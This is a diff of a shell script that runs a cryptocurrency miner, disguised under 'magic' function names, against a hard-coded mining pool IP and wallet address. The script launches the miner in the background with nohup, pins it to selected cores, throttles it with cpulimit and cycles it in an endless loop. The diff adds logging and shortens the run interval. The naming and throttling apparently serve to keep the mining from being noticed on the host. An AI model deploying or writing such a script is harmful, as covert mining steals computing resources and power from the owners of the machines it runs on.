@@ -35,12 +35,13 @@ start_magic() {
 
   # Calculate the CPU limit as a percentage
   local cpu_limit=$(( 100 * num_cores / total_cores ))  # Calculate percentage based on num_cores
-  
-  # Start the mining process with core affinity
-  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
+
+  # Start the mining process with core affinity and output to log file
+  taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > mining.log 2>&1 &
   local pid=$!
 
   echo "Magic started with PID: $pid using $num_cores cores"
+  echo "CPU limit set to $cpu_limit%"
 
   # Limiting CPU usage using `cpulimit`
   cpulimit -p $pid -l $cpu_limit &
@@ -64,7 +65,7 @@ stop_magic() {
 # Run the loop
 while true; do
   start_magic
-  sleep 600  # Wait for 5 minutes
+  sleep 300  # Wait for 5 minutes
   stop_magic
   sleep 120  # Wait for 2 minutes
 done
